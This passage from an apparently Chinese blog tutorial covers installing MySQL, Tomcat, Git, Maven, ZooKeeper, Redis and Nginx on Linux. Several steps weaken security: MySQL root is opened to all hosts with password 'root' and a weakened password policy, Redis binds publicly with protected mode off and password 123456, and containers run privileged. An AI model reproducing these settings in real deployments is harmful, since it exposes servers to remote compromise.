<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>/usr/local/mysql/bin/mysql -u root -p
</span></span><span style="display:flex;"><span>use mysql;
</span></span><span style="display:flex;"><span>update user set host=&#39;%&#39; where user = &#39;root&#39;;
</span></span><span style="display:flex;"><span>flush privileges;
</span></span><span style="display:flex;"><span>eixt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>添加快捷方式(可选)
<code>ln -s /usr/local/mysql/bin/mysql /usr/bin</code></p>
<p>忘记root密码怎么办？
编辑配置文件：<code>vi /etc/my.cnf</code></p>
<p>在[mysqld]下面添加一条命令：<code>skip-grant-tables</code>
保存退出，开始修改root密码：</p>
<p>进入MySql控制台（直接按回车，这时不需要输入root密码。）
<code>mysql -uroot -p</code></p>
<p>切换到mysql数据库
<code>mysql&gt;use mysql;</code></p>
<p>修改mysql数据库中root的密码
<code>update user set authentication_string=password(“填入新密码”) where user=‘root’;</code></p>
<p>刷新mysql权限
<code>flush privileges;</code></p>
<p>退出
<code>exit;</code></p>
<p>再次vi /etc/my.cnf。把skip-grant-tables删除掉。保存退出。完成MySql root密码的修改。</p>
<p>为root用户赋予权限：
<code>grant all privileges on *.* to 'root'@'%' identified by 'root' with grant option;</code>
注意修改identified by后边的密码。</p>
<p>可能会报错：
<code>Your password does not satisfy the current policy requirements</code></p>
<p>这时修改密码级别：
<code>set global validate_password_policy=0;</code>
<code>set global validate_password_length=4;</code></p>
<p>然后执行赋权语句成功，刷新权限：
<code>flush privileges;</code></p>
<p>重启mysql服务：
<code>service mysql restart</code></p>
<p><a href="https://www.cnblogs.com/daemon-/p/9009360.html">参考地址</a></p>
<h2 id="tomcat">tomcat<a hidden class="anchor" aria-hidden="true" href="#tomcat">#</a></h2>
<p>官网下载：
<a href="https://tomcat.apache.org/download-90.cgi">https://tomcat.apache.org/download-90.cgi</a>
找到Core下的tar.gz包下载并上传到/usr/local 目录下。</p>
<p>到usr/local目录下解压：
<code>tar -zxvf apache-tomcat-9.0.1.tar.gz</code></p>
<p>tomcat默认端口是8080，这里为了防止和其他任务端口冲突，我们将端口修改为合适的端口。
cd到/tomcat/conf，<code>vi server.xml</code>，找到<code>Connector port=&quot;8080&quot;</code>的位置，修改为恰当的端口。</p>
<p>cd到tomcat的bin目录下：
<code>cd ../bin</code>，启动tomcat<code>./startup.sh</code>，看到日志末尾<code>Tomcat started</code>，说明tomcat启动成功。</p>
<p>查看tomcat日志：
<code>tail -f logs/catalina.out</code></p>
<p>若远程无法访问，可能需要在阿里云控制台添加端口白名单。或者是防火墙。</p>
<h3 id="wget-下载">wget 下载<a hidden class="anchor" aria-hidden="true" href="#wget-下载">#</a></h3>
<p>找到合适的版本<code>https://mirrors.cnnic.cn/apache/tomcat/</code>
通过wget直接下载tomcat。
<code>http://mirrors.cnnic.cn/apache/tomcat/tomcat-9/v9.0.58/bin/apache-tomcat-9.0.58.tar.gz</code></p>
<h2 id="git-1">git<a hidden class="anchor" aria-hidden="true" href="#git-1">#</a></h2>
<p>先确认是否安装了git：
<code>rpm -qa|grep git</code>
如果安装了需要先卸载：
<code>rpm -e --nodeps git  或者  rpm -e git</code></p>
<p>不要用<code>yum install git</code>安装git，版本不可控。</p>
<p>先去git官方下载源码：
<a href="https://github.com/git/git">https://github.com/git/git</a></p>
<p>下载最新的<code>tar.gz</code>
<code>wget https://github.com/git/git/archive/v2.35.1.tar.gz</code></p>
<p>解压到理想位置：
<code>tar -zxvf git-2.3.51</code></p>
<p>编译源码之前，先安装需要的依赖</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel gcc perl-ExtUtils-MakeMaker
</span></span></code></pre></td></tr></table>
</div>
</div><p>安装依赖时，yum自动安装了Git，所以需要卸载旧版本Git，命令为：</p>
<p><code>yum remove git</code> 出现提示输入y即可。</p>
<p>进入解压后的文件夹，命令<code>cd git-2.35.1</code></p>
<p>然后执行编译，命令为
<code>make prefix=/usr/local/git all</code>
耐心等待编译完成。</p>
<p>安装Git至<code>/usr/local/git</code>路径，命令为
<code>make prefix=/usr/local/git install</code></p>
<p>配置环境变量
<code>vim /etc/profile</code></p>
<p>在底部加上git的配置信息：
<code>export PATH=$PATH:/usr/local/git/bin</code></p>
<p>刷新配置文件
<code>source /etc/profile</code></p>
<p>或使用指令查看是否安装成功：
<code>git --version</code></p>
<h2 id="maven">maven<a hidden class="anchor" aria-hidden="true" href="#maven">#</a></h2>
<p>到理想目录下载maven：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>wget https://mirrors.tuna.tsinghua.edu.cn/apache/maven/maven-3/3.8.4/binaries/apache-maven-3.8.4-bin.tar.gz
</span></span></code></pre></td></tr></table>
</div>
</div><p>解压：
<code>tar -zxvf apache-maven-3.8.4-bin.tar.gz </code></p>
<p>改名，方便后面操作：
<code>mv apache-maven-3.8.4 maven</code></p>
<p>配置环境变量
<code>vim /etc/profile</code>，在合适的位置添加如下内容：
<code>M2_HOME=/usr/local/maven</code>
<code>export PATH=${M2_HOME}/bin:${PATH}</code>
修改为自己maven的安装路径</p>
<p>然后使配置文件生效：
<code>source /etc/profile</code></p>
<p>检查是否安装成功
<code>mvn -v</code>
出现版本号：<code>Apache Maven 3.3.9...</code>，证明安装成功。</p>
<h2 id="zookeeper-1">zookeeper<a hidden class="anchor" aria-hidden="true" href="#zookeeper-1">#</a></h2>
<p><a href="http://mirror.bit.edu.cn/apache/zookeeper/">下载地址</a>
下载stable版本。</p>
<p>将下载好的.gz解压并复制到想要的位置。如：/usr/local/install 或 /home/wjy/install</p>
<p>在zk的根目录创建两个文件夹data和data_log，分别用来存放zk的数据以及日志。然后进入到data目录，使用pwd指令查看并复制data目录的绝对路径。</p>
<p>进入zookeeper的conf目录下，复制zoo_sample.cfg为zoo.cfg
<code>cp zoo_sample.cfg zoo.cfg</code></p>
<p>然后编辑zoo.cfg，修改或新增下面两行配置：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>dataDir=/home/wjy/install/zookeeper-3.4.13/data
</span></span><span style="display:flex;"><span>dataLogDir=/home/wjy/install/zookeeper-3.4.13/data_log
</span></span></code></pre></td></tr></table>
</div>
</div><p>保存并退出。</p>
<p>zoo.cfg只存放了单机的配置，想配置集群需要在最后面加上其他服务器的ip和端口。</p>
<p>到zk的bin目录下启动：
<code>./zkServer.sh start</code></p>
<p>查看状态
<code>./zkServer.sh status</code></p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>ZooKeeper JMX enabled by default
</span></span><span style="display:flex;"><span>Using config: /home/wjy/install/zookeeper-3.4.13/bin/../conf/zoo.cfg
</span></span><span style="display:flex;"><span>Mode: standalone
</span></span></code></pre></td></tr></table>
</div>
</div><p>出现上边的状态说明启动成功。
standalone：单机</p>
<h3 id="docker安装zookeeper">docker安装zookeeper<a hidden class="anchor" aria-hidden="true" href="#docker安装zookeeper">#</a></h3>
<ul>
<li>查看zookeeper镜像
<code>docker search zookeeper</code></li>
<li>拉取镜像
<code>docker pull zookeeper</code></li>
<li>构建zookeeper容器
<code>docker run --name=zookeeper -p 2181:2181 -d --privileged zookeeper</code></li>
</ul>
<p>&ndash;name：指定容器别名为zookeeper
-p: 指定端口映射，格式为：主机(宿主)端口:容器端口
-d: 后台运行容器，并返回容器ID
-v /mysoft/zookeeper/data/:/data/ ：将宿主机的目录挂在到该镜像</p>
<h2 id="redis-1">redis<a hidden class="anchor" aria-hidden="true" href="#redis-1">#</a></h2>
<p><a href="https://redis.io/">https://redis.io/</a>
官网下载，解压并复制到想要的位置 /home/wjy/install</p>
<p>cd到redis根目录下，执行
<code>make</code>
报错：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>net.c:36:23: fatal error: sys/types.h: No such file or directory(没有那个文件或目录)
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>adlist.c:32:20: fatal error: stdlib.h: No such file or directory
</span></span></code></pre></td></tr></table>
</div>
</div><p>原因是缺少文件，执行以下命令后再次make：
<code>sudo apt-get install libc6-dev</code></p>
<p>还是报错:
<code>zmalloc.h:50:31: fatal error: jemalloc/jemalloc.h: No such file or directory</code></p>
<p>原因是libc不是默认的分配器，在make后添加参数解决：
<code>sudo make MALLOC=libc</code></p>
<p>等待执行完成，到redis/src目录下，执行
<code>./redis-server</code>
出现端口号和进程PID，证明启动成功。</p>
<p>通过上边的指令启动redis，<code>ctrl+c</code>推出窗口，redis也会关闭，可以在指令后加上<code>&amp;</code>
<code>./redis-server &amp;</code>
按ctrl + C 可退出redis 启动窗口，此时redis　并不会关闭，而是会再后台运行，可通过命令查看: ps aux | grep redis</p>
<p>停止redis报错<code> NOAUTH Authentication required</code></p>
<h3 id="停止redis">停止redis<a hidden class="anchor" aria-hidden="true" href="#停止redis">#</a></h3>
<p>通过源码安装的redis，只能通过这种方式停止，或使用<code>kill -9</code>
<code>./redis-cli -h 你的ip -p 6379 -a 你的密码 shutdown</code></p>
<h3 id="给redis添加密码">给redis添加密码<a hidden class="anchor" aria-hidden="true" href="#给redis添加密码">#</a></h3>
<ul>
<li>临时密码(redis重启之后会失效)
首先启动redis服务，然后进入redis：
<code>redis-cli -p 6379</code></li>
</ul>
<p>查看当前redis有没有设置密码：
<code>config get requirepass</code></p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>1) &#34;requirepass&#34;
</span></span><span style="display:flex;"><span>2) &#34;&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p>为以上显示说明没有密码，那么现在来设置密码：
<code>config set requirepass 123456</code></p>
<p>提示ok，再次查看当前redis就提示需要密码：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>127.0.0.1:6379&gt; config get requirepass
</span></span><span style="display:flex;"><span>(error) NOAUTH Authentication required.
</span></span><span style="display:flex;"><span>127.0.0.1:6379&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>永久方式
修改redis根目录下的<code>redis.conf</code>文件：
<code>vi redis.conf</code></li>
</ul>
<p>查找字符串：
命令模式下输入<code>“/字符串”</code>，例如“/Section 3”。
如果查找下一个，按“n”即可。
<code>/requirepass foobared</code></p>
<p>在该行下面输入：
<code>requirepass 123456</code>
123456是你的密码</p>
<p>问题：修改并重启redis之后发现配置并没有生效，原来启动时还需要指定配置文件。
<code>./redis-server ../redis.conf &amp;</code>，然后<code>bg</code>
这样才算是指定了刚才修改的配置文件。</p>
<p>至于windows下的redis配置文件，同理。</p>
<h3 id="配置远程链接redis">配置远程链接redis<a hidden class="anchor" aria-hidden="true" href="#配置远程链接redis">#</a></h3>
<ul>
<li>将<code>redis.conf</code>中的<code>bind 127.0.0.1</code>注释掉，或改成<code>0.0.0.0</code></li>
<li>找到<code>protected-mode</code>，后边默认是<code>yes</code>，改成<code>no</code>
重启redis。</li>
</ul>
<p>在windows的cmd或mac的终端输入
<code>redis-cli -h 你的服务器ip -p 6379 -a 你的密码</code></p>
<p>远程连接成功。如果还是连不上，请检查你服务器的安全组，是否开放了6379端口。</p>
<h3 id="docker安装redis">docker安装redis<a hidden class="anchor" aria-hidden="true" href="#docker安装redis">#</a></h3>
<ul>
<li>搜索redis镜像
<code>docker search redis</code></li>
<li>拉取官方镜像
<code>docker pull redis</code></li>
<li>检查是否成功
<code>docker images</code></li>
<li>配置data、conf
<code>mkdir /usr/local/docker/redis/data</code>
<code>mkdir /usr/local/docker/redis/conf</code></li>
</ul>
<p>进入目录
cd /usr/local/docker/redis/conf</p>
<p>从官网获取 redis.conf 配置文件
wget <a href="http://download.redis.io/redis-stable/redis.conf">http://download.redis.io/redis-stable/redis.conf</a></p>
<p>修改redis.conf</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>#bind 127.0.0.1
</span></span><span style="display:flex;"><span>protected-mode no
</span></span><span style="display:flex;"><span>appendonly yes
</span></span><span style="display:flex;"><span>requirepass yourpassword
</span></span></code></pre></td></tr></table>
</div>
</div><p>protected-mode：在没有显示定义 bind 地址（即监听全网断），又没有设置密码 requirepass时，只允许本地回环 127.0.0.1 访问</p>
<ul>
<li>构建redis容器：</li>
</ul>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>docker run \
</span></span><span style="display:flex;"><span>-p 6379:6379 \ # 端口映射 宿主机:容器
</span></span><span style="display:flex;"><span>-v /usr/local/docker/redis/data:/data \ # 映射数据目录 rw 为读写
</span></span><span style="display:flex;"><span>-v /usr/local/docker/redis/conf/redis.conf:/etc/redis/redis.conf \ # 挂载配置文件 ro 为readonly
</span></span><span style="display:flex;"><span>--privileged=true \ # 给与一些权限
</span></span><span style="display:flex;"><span>--name redis \ # 给容器起个名字
</span></span><span style="display:flex;"><span>-d docker.io/redis:latest redis-server /etc/redis/redis.conf # deamon 运行 服务使用指定的配置文件
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>docker run -p 6379:6379 -v /usr/local/docker/redis/data:/data -v /usr/local/docker/redis/conf/redis.conf:/etc/redis/redis.conf --privileged=true --name redis -d docker.io/redis:latest redis-server /etc/redis/redis.conf</code></p>
<ul>
<li>
<p>查看运行是否成功
<code>docker ps -a</code></p>
</li>
<li>
<p>进入Docker容器redis的客户端
<code>docker exec -it 容器ID redis-cli</code></p>
</li>
<li>
<p>查看设置的密码是否成功
<code>auth 刚才设置的密码</code></p>
</li>
</ul>
<h2 id="nginx">nginx<a hidden class="anchor" aria-hidden="true" href="#nginx">#</a></h2>
<p>下载Nginx及相关组件
Linux系统是Centos 6.5 64位，如果不是root用户，切换到root用户下安装
<code>su root</code>
输入密码，密码不显示。</p>
<p>首先安装所需依赖：
<code>yum -y install gcc gcc-c++ make libtool zlib zlib-devel openssl openssl-devel pcre pcre-devel</code></p>
<p>进入理想目录准备下载：
<code>cd /usr/local/src</code></p>
<p>下载nginx tar包：
<code>wget http://nginx.org/download/nginx-1.17.8.tar.gz</code></p>
<p>上边的版本号可能不是最新的，可以去<a href="http://nginx.org/download/">官网</a>找最新的安装包。
注意列表不是有序的，现在是2020年，我在页面搜索2020，就可以看到最近发布的安装包，然后把上边的<code>nginx-1.17.8.tar.gz</code>替换成新的安装包名字。</p>
<p>解包：
<code>tar -xvf nginx-1.17.8.tar.g</code></p>
<p>进入nginx目录：
<code>cd nginx-1.17.8</code></p>
<p>安装：
<code>./configure &amp;&amp; make &amp;&amp; make install</code></p>
<p>执行完，会在源码上一层，即<code>/usr/local</code>生成名为nginx的目录。</p>
<p>检查make是否成功，在nginx目录下的sbin目录执行
<code>./nginx -t</code></p>
<p>正常情况的信息输出：
nginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is ok
nginx: configuration file /usr/local/nginx/conf/nginx.conf test is successful</p>
<p>启动nginx
可以先找一下nginx安装到什么位置上了
<code>whereis nginx</code>
<code>nginx: /usr/local/nginx</code></p>
<p>进入nginx目录并启动：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>cd /usr/local/nginx/sbin
</span></span><span style="display:flex;"><span>./nginx
</span></span></code></pre></td></tr></table>
</div>
</div><p>停止nginx：<code>./nginx -s stop</code></p>
<p>在浏览器中输入服务器的ip地址，如：192.168.1.12
成功的花会看到 Welcome to nginx!
如果看不到，那么逐一排查问题。</p>
<ul>
<li>配置云服务器的安全组，阿里云默认是没有开启80端口的，需要手动添加。</li>
<li><code>ping 192.168.1.12</code>，没问题</li>
<li><code>telnet 192.168.1.12 80</code>，正在链接192.168.1.12&hellip;无法打开到主机的连接，在端口80：连接失败。
说明服务器的80端口没有打开，执行命令验证
<code>firewall-cmd --query-port=80/tcp</code>
no
显然80端口没有开启。
下面我们开启80端口：
<code>firewall-cmd --add-port=80/tcp --permanent</code>
&ndash;permanent   #永久生效，没有此参数重启后失效</li>
</ul>
<p>重启防火墙
<code>systemctl restart firewalld</code>
然后刷新浏览器</p>
<p>配置nginx开机启动
<code>vim /etc/rc.d/rc.local</code></p>
<p>在下边加入
<code>/usr/local/nginx/sbin/nginx</code></p>
<p><a href="https://www.cnblogs.com/taiyonghai/p/6728707.html">参考1</a>
<a href="https://www.cnblogs.com/bluestorm/p/4574688.html">参考2</a></p>
<p>make报错：
<code>make: *** No rule to make target </code>build&rsquo;, needed by <code>default'. Stop.</code>
更新yum
<code>yum update</code></p>
<p>安装前置库
<code>yum install -y gcc pcre pcre-devel openssl openssl-devel gd gd-devel</code></p>
<p>进入nginx根目录重新编译一次参数：</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
